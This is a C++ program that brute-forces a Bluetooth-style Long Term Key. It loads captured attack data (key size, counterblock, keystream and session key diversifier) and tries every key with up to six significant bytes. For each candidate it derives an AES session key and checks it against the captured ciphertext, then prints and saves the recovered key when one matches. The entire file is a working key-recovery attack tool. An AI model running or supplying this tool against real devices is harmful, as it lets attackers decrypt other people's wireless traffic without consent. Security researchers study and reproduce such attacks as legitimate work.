#include <array>
#include <cstdint>
#include <fstream>
#include <iostream>
#include <stdexcept>
#include <string>
#include <math.h>
#include <chrono>         
#include <openssl/aes.h>

// Struct to represent attack data
// - key size is the amount of non zero bytes in the key 
//   (One could say it is the length of the key, but length is always 16 bytes, it is the most significant bytes that are set to zero)
// - P is the plaintext (counterblock)
// - C is the ciphertext (keystream)
// - SKD is the session key diversifier (session key is computed with AES_LTK(SKD) )
// - 49 bytes of data
struct AttackData {
    uint8_t key_size;                 
    std::array<uint8_t, 16> P;        
    std::array<uint8_t, 16> C;        
    std::array<uint8_t, 16> SKD;      
};

// Function to encrypt a 16 byte block using AES-ECB 128
// - key is the aes 128 key
// - in is the plaintext
// - out is the ciphertext
void aes128_ecb_encrypt(const uint8_t key[16], const uint8_t in[16], uint8_t out[16]){
    AES_KEY aes_key;
    if (AES_set_encrypt_key(key, 128, &aes_key) != 0) {
        throw std::runtime_error("AES_set_encrypt_key failed");
    }
    AES_encrypt(in, out, &aes_key);
}

// Function to load the attack data, returns a AttackData struct
// - path is the path to the file that contains the attack data (file should contain 49 bytes)
AttackData load_attack_data(const std::string &path) {
    AttackData d{};
    std::ifstream f(path, std::ios::binary);
    if (!f) {
        throw std::runtime_error("cannot open attack_data file: " + path);
    }

    char ks;
    f.read(&ks, 1);
    if (!f) {
        throw std::runtime_error("attack_data file too short (no key_size)");
    }
    d.key_size = static_cast<uint8_t>(ks);

    f.read(reinterpret_cast<char*>(d.P.data()),   16);
    f.read(reinterpret_cast<char*>(d.C.data()),   16);
    f.read(reinterpret_cast<char*>(d.SKD.data()), 16);
    if (!f) {
        throw std::runtime_error("attack_data file too short (expected 49 bytes)");
    }

    if (d.key_size == 0 || d.key_size > 16) {
        throw std::runtime_error("invalid key_size in attack_data");
    }

    return d;
}

// Function to write the LTK to the specified filepath
// - path is filepath where the LTK will be written to
// - ltk is the bruteforced LTK  
void write_ltk(const std::string &path, const uint8_t ltk[16]) {
    std::ofstream f(path, std::ios::binary | std::ios::trunc);
    if (!f) {
        throw std::runtime_error("cannot open ltk output file: " + path);
    }
    f.write(reinterpret_cast<const char*>(ltk), 16);
}

// Function to convert the LTK to hex value to print it 
std::string to_hex(const uint8_t *data, std::size_t len) {
    static const char hex_digits[] = "0123456789abcdef";
    std::string s;
    s.reserve(len * 2);
    for (std::size_t i = 0; i < len; ++i) {
        uint8_t byte = data[i];
        s.push_back(hex_digits[byte >> 4]);
        s.push_back(hex_digits[byte & 0x0F]);
    }
    return s;
}

// Function to bruteforce the ltk, by comparing the ciphertexts formed with the candidate session keys with the original ciphertext
int main(int argc, char **argv) {
    if (argc != 3) {
        std::cerr << "Wrong usage of this function, provide path for attack data and path to store LTK!\n";
        return 1;
    }

    const std::string attack_path = argv[1];
    const std::string ltk_path    = argv[2];

    try {
        AttackData d = load_attack_data(attack_path);

        const int key_size   = static_cast<int>(d.key_size);
        const int zero_bytes = 16 - key_size;

        if (key_size > 6) {
            std::cerr << "key_size = " << key_size
                      << " is too large for this naive bruteforcer.\n";
            return 1;
        }
        uint64_t total = (uint64_t)pow(2.0, 8.0 * key_size);
        std::cout << "Bruteforcing key_size=" << key_size
                  << " => " << total << " candidates\n";


        std::array<uint8_t, 16> base_ltk{};
        base_ltk.fill(0x00);

        uint8_t candidate_sk[16];
        uint8_t candidate_cipher[16];

        auto t_start = std::chrono::steady_clock::now();

        for (uint64_t i = 0; i < total; ++i) {
            std::array<uint8_t, 16> candidate_ltk = base_ltk;

            // form next candidate LTK
            uint64_t tmp = i;
            for (int b = key_size - 1; b >= 0; --b) {
                uint8_t byte = static_cast<uint8_t>(tmp & 0xFF);
                candidate_ltk[zero_bytes + b] = byte;
                tmp >>= 8;
            }

            aes128_ecb_encrypt(candidate_ltk.data(), d.SKD.data(), candidate_sk); // compute candidate session key
            aes128_ecb_encrypt(candidate_sk, d.P.data(), candidate_cipher); // compute ciphertext with candidate session key

            // compare real ciphertext with ciphertext computed with candidate session key 
            bool match = true;
            for (int j = 0; j < 16; ++j) {
                if (candidate_cipher[j] != d.C[j]) {
                    match = false;
                    break;
                }
            }

            if (match) {
                auto t_end = std::chrono::steady_clock::now();
                std::chrono::duration<double> elapsed = t_end - t_start;

                std::cout << "Found LTK! \n";
                write_ltk(ltk_path, candidate_ltk.data()); //write LTK to file

                std::cout << "LTK = " << to_hex(candidate_ltk.data(), 16) << "\n";
                std::cout << "SK  = " << to_hex(candidate_sk, 16)      << "\n";

                std::cout << "Bruteforce time: "
                          << elapsed.count() << " seconds\n";

                return 0;
            }
        }

        auto t_end = std::chrono::steady_clock::now();
        std::chrono::duration<double> elapsed = t_end - t_start;

        std::cerr << "No key found.\n";
        std::cerr << "Bruteforce time: "
                  << elapsed.count() << " seconds\n";
        return 1;

    } catch (const std::exception &e) {
        std::cerr << "Error: " << e.what() << "\n";
        return 1;
    }
}
